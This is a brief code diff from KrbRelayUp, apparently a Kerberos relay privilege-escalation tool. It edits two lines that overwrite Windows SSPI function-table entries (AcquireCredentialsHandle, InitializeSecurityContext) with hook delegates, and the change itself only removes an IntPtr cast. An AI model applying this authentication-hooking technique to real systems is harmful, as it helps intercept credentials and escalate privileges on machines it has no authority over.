@@ -38,13 +38,13 @@ namespace KrbRelayUp
             FuncAcquireCredentialsHandle DelegAcquireCredentialsHandle = new FuncAcquireCredentialsHandle(AcquireCredentialsHandleHook);
             byte[] bAcquireCredentialsHandle = BitConverter.GetBytes(Marshal.GetFunctionPointerForDelegate(DelegAcquireCredentialsHandle).ToInt64());
             int oAcquireCredentialsHandle = Marshal.OffsetOf(typeof(SecurityFunctionTable), "AcquireCredentialsHandle").ToInt32();
-            Marshal.Copy(bAcquireCredentialsHandle, 0, (IntPtr)functionTable + oAcquireCredentialsHandle, bAcquireCredentialsHandle.Length);
+            Marshal.Copy(bAcquireCredentialsHandle, 0, functionTable + oAcquireCredentialsHandle, bAcquireCredentialsHandle.Length);
 
             // Hook InitializeSecurityContext function
             FuncInitializeSecurityContext DelegInitializeSecurityContext = new FuncInitializeSecurityContext(InitializeSecurityContextHook);
             byte[] bInitializeSecurityContext = BitConverter.GetBytes(Marshal.GetFunctionPointerForDelegate(DelegInitializeSecurityContext).ToInt64());
             int oInitializeSecurityContext = Marshal.OffsetOf(typeof(SecurityFunctionTable), "InitializeSecurityContext").ToInt32();
-            Marshal.Copy(bInitializeSecurityContext, 0, (IntPtr)functionTable + oInitializeSecurityContext, bInitializeSecurityContext.Length);
+            Marshal.Copy(bInitializeSecurityContext, 0, functionTable + oInitializeSecurityContext, bInitializeSecurityContext.Length);
 
             if (String.IsNullOrEmpty(serviceCommand))
             {
